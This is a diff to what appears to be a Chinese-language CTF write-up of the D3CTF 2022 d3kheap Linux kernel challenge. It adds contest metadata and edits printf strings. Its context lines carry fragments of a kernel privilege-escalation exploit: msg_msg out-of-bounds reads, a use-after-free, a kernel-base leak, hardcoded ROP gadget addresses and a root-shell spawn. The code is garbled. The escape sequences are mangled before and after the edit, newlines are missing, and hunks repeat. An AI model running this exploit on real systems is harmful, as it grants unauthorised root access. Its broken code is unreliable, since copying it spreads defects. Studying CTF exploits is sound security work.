@@ -73,6 +73,8 @@ prerequisites:
 - msg_msg IPC 机制 (msgsnd/msgrcv + MSG_COPY)
 - sk_buff / pipe_buffer 内核对象结构
 - ROPgadget 工具链
+contest_normalized: "D3CTF d3kheap"
+contest_year: 2022
 ---
 # 利用msg-msg结构体进行提权
 
@@ -303,7 +305,7 @@ void saveStatus()
             "pushf;"
             "pop user_rflags;"
             );
-    printf(" 33[34m 33[1m[*] Status has been saved. 33[0mn");
+    printf("\\x0033[34m\\x0033[1m[*] Status has been saved.\\x0033[0mn");
 }
 
 // 链表结构
@@ -372,7 +374,7 @@ struct pipe_buf_operations
 
 void errExit(char *msg)
 {
-    printf(" 33[31m 33[1m[x] Error: %s 33[0mn", msg);
+    printf("\\x0033[31m\\x0033[1m[x] Error: %s\\x0033[0mn", msg);
     exit(EXIT_FAILURE);
 }
 
@@ -437,7 +439,7 @@ void getRootShell(void)
     if (getuid())
         errExit("failed to gain the root!");
     
-    printf(" 33[32m 33[1m[+] Succesfully gain the root privilege, trigerring root shell now... 33[0mn");
+    printf("\\x0033[32m\\x0033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\\x0033[0mn");
     system("/bin/sh");
 }
 
@@ -582,7 +584,7 @@ int main(int argc, char **argv, char **envp)
     nearby_msg = (struct msg_msg*) 
             &oob_msg.mtext[(SECONDARY_MSG_SIZE) - sizeof(struct msg_msg)];
     
-    printf(" 33[32m 33[1m[+] addr of primary msg of msg nearby victim:  33[0m%llxn", 
+    printf("\\x0033[32m\\x0033[1m[+] addr of primary msg of msg nearby victim: \\x0033[0m%llxn", 
             nearby_msg->m_list.prev);
 
     if (freeSkBuff(sk_sockets, fake_secondary_msg, 
@@ -608,9 +610,9 @@ int main(int argc, char **argv, char **envp)
             &oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];
     victim_addr = nearby_msg_prim->m_list.next - 0x400;
     
-    printf(" 33[32m 33[1m[+] addr of msg next to victim:  33[0m%llxn", 
+    printf("\\x0033[32m\\x0033[1m[+] addr of msg next to victim: \\x0033[0m%llxn", 
             nearby_msg_prim->m_list.next);
-    printf(" 33[32m 33[1m[+] addr of msg UAF object:  33[0m%llxn", victim_addr);
+    printf("\\x0033[32m\\x0033[1m[+] addr of msg UAF object: \\x0033[0m%llxn", victim_addr);
 
     /*
      * Step.4
@@ -658,7 +660,7 @@ int main(int argc, char **argv, char **envp)
             
             if (pipe_buf_ptr->ops > 0xffffffff81000000)
             {
-                printf(" 33[32m 33[1m[+] got anon_pipe_buf_ops:  33[0m%llxn", 
+                printf("\\x0033[32m\\x0033[1m[+] got anon_pipe_buf_ops: \\x0033[0m%llxn", 
                         pipe_buf_ptr->ops);
                 kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
                 kernel_base = 0xffffffff81000000 + kernel_offset;
@@ -666,7 +668,7 @@ int main(int argc, char **argv, char **envp)
         }
     }
 
-    printf(" 33[32m 33[1m[+] kernel base:  33[0m%llx  33[32m 33[1moffset:  33[0m%llxn", 
+    printf("\\x0033[32m\\x0033[1m[+] kernel base: \\x0033[0m%llx \\x0033[32m\\x0033[1moffset: \\x0033[0m%llxn", 
             kernel_base, kernel_offset);
     
     /*
@@ -794,7 +796,7 @@ void saveStatus()
             "pushf;"
             "pop user_rflags;"
             );
-    printf(" 33[34m 33[1m[*] Status has been saved. 33[0mn");
+    printf("\\x0033[34m\\x0033[1m[*] Status has been saved.\\x0033[0mn");
 }
 
 long dev_fd;
@@ -858,7 +860,7 @@ struct 
 // 错误处理函数
 void errExit(char *msg)
 {
-    printf(" 33[31m 33[1m[x] Error: %s 33[0mn", msg);
+    printf("\\x0033[31m\\x0033[1m[x] Error: %s\\x0033[0mn", msg);
     exit(EXIT_FAILURE);
 }
 
@@ -1035,7 +1037,7 @@ struct
   nearby_msg = (struct msg_msg*) 
             &oob_msg.mtext[(SECONDARY_MSG_SIZE) - sizeof(struct msg_msg)];
     
-    printf(" 33[32m 33[1m[+] addr of primary msg of msg nearby victim:  33[0m%llxn", 
+    printf("\\x0033[32m\\x0033[1m[+] addr of primary msg of msg nearby victim: \\x0033[0m%llxn", 
             nearby_msg->m_list.prev);
 if (freeSkBuff(sk_sockets, fake_secondary_msg, 
             sizeof(fake_secondary_msg)) < 0)
@@ -1060,9 +1062,9 @@ if (freeSkBuff(sk_sockets, fake_secondary_msg, 
             &oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];
     victim_addr = nearby_msg_prim->m_list.next - 0x400;
     
-    printf(" 33[32m 33[1m[+] addr of msg next to victim:  33[0m%llxn", 
+    printf("\\x0033[32m\\x0033[1m[+] addr of msg next to victim: \\x0033[0m%llxn", 
             nearby_msg_prim->m_list.next);
-    printf(" 33[32m 33[1m[+] addr of msg UAF object:  33[0m%llxn", victim_addr);
+    printf("\\x0033[32m\\x0033[1m[+] addr of msg UAF object: \\x0033[0m%llxn", victim_addr);
 if (freeSkBuff(sk_sockets, fake_secondary_msg, 
             sizeof(fake_secondary_msg)) < 0)
         errExit("failed to release sk_buff!");
@@ -1105,7 +1107,7 @@ pipe_buf_ptr = (struct pipe_buffer *) &fake_secondary_msg;
             
             if (pipe_buf_ptr->ops > 0xffffffff81000000)
             {
-                printf(" 33[32m 33[1m[+] got anon_pipe_buf_ops:  33[0m%llxn", 
+                printf("\\x0033[32m\\x0033[1m[+] got anon_pipe_buf_ops: \\x0033[0m%llxn", 
                         pipe_buf_ptr->ops);
                 kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
                 kernel_base = 0xffffffff81000000 + kernel_offset;
@@ -1113,7 +1115,7 @@ pipe_buf_ptr = (struct pipe_buffer *) &fake_secondary_msg;
         }
     }
 
-    printf(" 33[32m 33[1m[+] kernel base:  33[0m%llx  33[32m 33[1moffset:  33[0m%llxn", 
+    printf("\\x0033[32m\\x0033[1m[+] kernel base: \\x0033[0m%llx \\x0033[32m\\x0033[1moffset: \\x0033[0m%llxn", 
             kernel_base, kernel_offset);
     #define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede
     #define POP_RDI_RET 0xffffffff810938f0
@@ -1138,7 +1140,7 @@ void getRootShell(void)
     if (getuid())
         errExit("failed to gain the root!");
     
-    printf(" 33[32m 33[1m[+] Succesfully gain the root privilege, trigerring root shell now... 33[0mn");
+    printf("\\x0033[32m\\x0033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\\x0033[0mn");
     system("/bin/sh");
 }
   
@@ -1257,7 +1259,7 @@ void saveStatus()
             "pushf;"
             "pop user_rflags;"
             );
-    printf(" 33[34m 33[1m[*] Status has been saved. 33[0mn");
+    printf("\\x0033[34m\\x0033[1m[*] Status has been saved.\\x0033[0mn");
 }
 
 // 链表结构
@@ -1326,7 +1328,7 @@ struct pipe_buf_operations
 
 void errExit(char *msg)
 {
-    printf(" 33[31m 33[1m[x] Error: %s 33[0mn", msg);
+    printf("\\x0033[31m\\x0033[1m[x] Error: %s\\x0033[0mn", msg);
     exit(EXIT_FAILURE);
 }
 
@@ -1391,7 +1393,7 @@ void getRootShell(void)
     if (getuid())
         errExit("failed to gain the root!");
     
-    printf(" 33[32m 33[1m[+] Succesfully gain the root privilege, trigerring root shell now... 33[0mn");
+    printf("\\x0033[32m\\x0033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\\x0033[0mn");
     system("/bin/sh");
 }
 
@@ -1536,7 +1538,7 @@ int main(int argc, char **argv, char **envp)
     nearby_msg = (struct msg_msg*) 
             &oob_msg.mtext[(SECONDARY_MSG_SIZE) - sizeof(struct msg_msg)];
     
-    printf(" 33[32m 33[1m[+] addr of primary msg of msg nearby victim:  33[0m%llxn", 
+    printf("\\x0033[32m\\x0033[1m[+] addr of primary msg of msg nearby victim: \\x0033[0m%llxn", 
             nearby_msg->m_list.prev);
 
     if (freeSkBuff(sk_sockets, fake_secondary_msg, 
@@ -1562,9 +1564,9 @@ int main(int argc, char **argv, char **envp)
             &oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];
     victim_addr = nearby_msg_prim->m_list.next - 0x400;
     
-    printf(" 33[32m 33[1m[+] addr of msg next to victim:  33[0m%llxn", 
+    printf("\\x0033[32m\\x0033[1m[+] addr of msg next to victim: \\x0033[0m%llxn", 
             nearby_msg_prim->m_list.next);
-    printf(" 33[32m 33[1m[+] addr of msg UAF object:  33[0m%llxn", victim_addr);
+    printf("\\x0033[32m\\x0033[1m[+] addr of msg UAF object: \\x0033[0m%llxn", victim_addr);
 
     /*
      * Step.4
@@ -1612,7 +1614,7 @@ int main(int argc, char **argv, char **envp)
             
             if (pipe_buf_ptr->ops > 0xffffffff81000000)
             {
-                printf(" 33[32m 33[1m[+] got anon_pipe_buf_ops:  33[0m%llxn", 
+                printf("\\x0033[32m\\x0033[1m[+] got anon_pipe_buf_ops: \\x0033[0m%llxn", 
                         pipe_buf_ptr->ops);
                 kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
                 kernel_base = 0xffffffff81000000 + kernel_offset;
@@ -1620,7 +1622,7 @@ int main(int argc, char **argv, char **envp)
         }
     }
 
-    printf(" 33[32m 33[1m[+] kernel base:  33[0m%llx  33[32m 33[1moffset:  33[0m%llxn", 
+    printf("\\x0033[32m\\x0033[1m[+] kernel base: \\x0033[0m%llx \\x0033[32m\\x0033[1moffset: \\x0033[0m%llxn", 
             kernel_base, kernel_offset);
     
     /*
